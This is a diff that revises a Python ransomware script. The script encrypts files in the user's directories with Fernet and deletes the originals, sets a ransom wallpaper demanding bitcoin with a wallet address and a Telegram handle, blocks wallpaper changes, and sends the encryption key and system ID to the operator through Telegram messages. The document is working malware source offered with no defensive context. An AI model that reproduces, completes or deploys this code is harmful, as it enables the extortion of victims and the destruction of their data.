@@ -2,7 +2,6 @@ import os
 import hashlib
 from cryptography.fernet import Fernet
 import requests
-import subprocess
 import winreg
 import random
 import string
@@ -46,13 +45,12 @@ def encrypt_file(file_path, key):
         with open(file_path, "rb") as file:
             content = file.read()
         encrypted_content = cipher.encrypt(content)
-        new_name = os.path.join(os.path.dirname(file_path), generate_random_name() + ".enc")
+
+        new_name = file_path + ".enc"
         with open(new_name, "wb") as file:
             file.write(encrypted_content)
         os.remove(file_path)
-    except PermissionError:
-        pass
-    except Exception:
+    except Exception as e:
         pass
 
 def encrypt_directory(directory, key):
@@ -87,10 +85,6 @@ def get_user_directories():
             directories.append(drive_path)
     return directories
 
-def generate_random_name(length=10):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
-
 def generate_system_id():
     mac = uuid.getnode()
     system = platform.system()
@@ -110,11 +104,12 @@ def create_ransom_background(system_id):
         font = ImageFont.load_default()
 
     ransom_message = f"""
-    [!] YOUR FILES HAVE BEEN ENCRYPTED
-    Send $300 in BTC to the following address:
-    1FzWLkYX1Bz6PkpA5J5bZkLU5Rz5ZuXKhV
-    Contact our support on Telegram to receive the decryption key.
-    System ID: {system_id}
+    Oh no! YOUR FILES HAVE BEEN ENCRYPTED!
+    To decrypt your files, you need to pay us 1000$ in bitcoin.
+    When you have paid, contact us in telegram with your system ID.
+    Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+    Telegram: @hacker123
+    Your System ID: {system_id}
     """
 
     draw.text((200, 300), ransom_message, fill="red", font=font)
@@ -151,8 +146,9 @@ if __name__ == '__main__':
     system_id = generate_system_id()
     send_telegram_message(f"‼️ Ransomware executed.\n ℹ️ System ID: {system_id}\n ℹ️ Key: {encryption_key.decode()}")
     set_ransom_background(system_id)
+    disable_wallpaper_change()
     directories = get_user_directories()
     for directory in directories:
         if os.path.exists(directory):
             encrypt_directory(directory, encryption_key)
-    disable_wallpaper_change()
+    send_telegram_message(f"✅ Ransomware finished.\n ℹ️ System ID: {system_id}")
